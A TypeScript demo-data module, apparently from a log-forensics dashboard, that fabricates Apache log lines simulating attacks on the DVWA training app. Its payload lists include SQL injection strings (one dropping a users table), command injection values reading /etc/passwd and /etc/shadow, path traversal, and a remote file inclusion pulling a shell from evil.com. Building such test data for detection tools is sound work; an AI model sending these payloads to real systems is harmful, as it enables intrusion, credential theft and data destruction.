/**
 * Demo data generator — produces realistic Apache log lines
 * simulating attacks against DVWA so the dashboard works
 * without a real Docker daemon.
 */

import { generateId } from "@/lib/utils/ids";
import type { ContainerInfo } from "@/types/forensic";

const IPS = [
  "192.168.1.100",
  "192.168.1.101",
  "10.0.0.55",
  "172.16.0.12",
  "192.168.1.200",
];

const NORMAL_PATHS = [
  "/",
  "/login.php",
  "/index.php",
  "/setup.php",
  "/security.php",
  "/vulnerabilities/",
  "/dvwa/css/main.css",
  "/dvwa/images/logo.png",
  "/dvwa/js/dvwaPage.js",
  "/favicon.ico",
];

const SQLI_PAYLOADS = [
  "/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit",
  "/vulnerabilities/sqli/?id=1'+UNION+SELECT+null,table_name+FROM+information_schema.tables--&Submit=Submit",
  "/vulnerabilities/sqli/?id='+OR+1=1--&Submit=Submit",
  "/vulnerabilities/sqli/?id=1';+DROP+TABLE+users--&Submit=Submit",
  "/vulnerabilities/sqli/?id='+UNION+SELECT+user(),version()--&Submit=Submit",
  "/vulnerabilities/sqli/?id=1'+AND+SLEEP(5)--&Submit=Submit",
];

const CMDI_PAYLOADS = [
  "/vulnerabilities/exec/?ip=127.0.0.1;cat+/etc/passwd&Submit=Submit",
  "/vulnerabilities/exec/?ip=127.0.0.1;whoami&Submit=Submit",
  "/vulnerabilities/exec/?ip=127.0.0.1|ls+-la&Submit=Submit",
  "/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit",
  "/vulnerabilities/exec/?ip=127.0.0.1;uname+-a&Submit=Submit",
  "/vulnerabilities/exec/?ip=$(cat+/etc/shadow)&Submit=Submit",
];

const FI_PAYLOADS = [
  "/vulnerabilities/fi/?page=../../etc/passwd",
  "/vulnerabilities/fi/?page=../../../etc/shadow",
  "/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index",
  "/vulnerabilities/fi/?page=http://evil.com/shell.php",
  "/vulnerabilities/fi/?page=../../var/log/apache2/access.log",
  "/vulnerabilities/fi/?page=php://input",
];

const BRUTE_PAYLOADS = [
  "/login.php",
];

function randomEl<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function formatDate(d: Date): string {
  const months = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec",
  ];
  const pad = (n: number) => String(n).padStart(2, "0");
  return `${pad(d.getDate())}/${months[d.getMonth()]}/${d.getFullYear()}:${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} +0000`;
}

export function generateLogLine(): string {
  const now = new Date();
  const ip = randomEl(IPS);
  const dateStr = formatDate(now);
  const rand = Math.random();

  // 60% normal, 15% sqli, 10% cmdi, 10% brute force, 5% file inclusion
  if (rand < 0.6) {
    const path = randomEl(NORMAL_PATHS);
    const status = Math.random() < 0.9 ? 200 : Math.random() < 0.5 ? 304 : 404;
    const size = Math.floor(Math.random() * 10000) + 200;
    return `${ip} - - [${dateStr}] "GET ${path} HTTP/1.1" ${status} ${size}`;
  }

  if (rand < 0.75) {
    const path = randomEl(SQLI_PAYLOADS);
    const status = Math.random() < 0.7 ? 200 : 500;
    const size = Math.floor(Math.random() * 5000) + 500;
    return `${ip} - - [${dateStr}] "GET ${path} HTTP/1.1" ${status} ${size}`;
  }

  if (rand < 0.85) {
    const path = randomEl(CMDI_PAYLOADS);
    const size = Math.floor(Math.random() * 3000) + 300;
    return `${ip} - - [${dateStr}] "GET ${path} HTTP/1.1" 200 ${size}`;
  }

  if (rand < 0.95) {
    const path = randomEl(BRUTE_PAYLOADS);
    return `${ip} - - [${dateStr}] "POST ${path} HTTP/1.1" 302 145`;
  }

  // File Inclusion
  const path = randomEl(FI_PAYLOADS);
  const status = Math.random() < 0.6 ? 200 : 404;
  const size = Math.floor(Math.random() * 4000) + 200;
  return `${ip} - - [${dateStr}] "GET ${path} HTTP/1.1" ${status} ${size}`;
}

export function getDemoContainers(): ContainerInfo[] {
  return [
    {
      id: `demo-${generateId()}`,
      name: "dvwa",
      image: "vulnerables/web-dvwa:latest",
      state: "running",
      status: "Up 2 hours",
      created: new Date(Date.now() - 2 * 3600000).toISOString(),
      ports: "0.0.0.0:8080->80/tcp",
    },
  ];
}
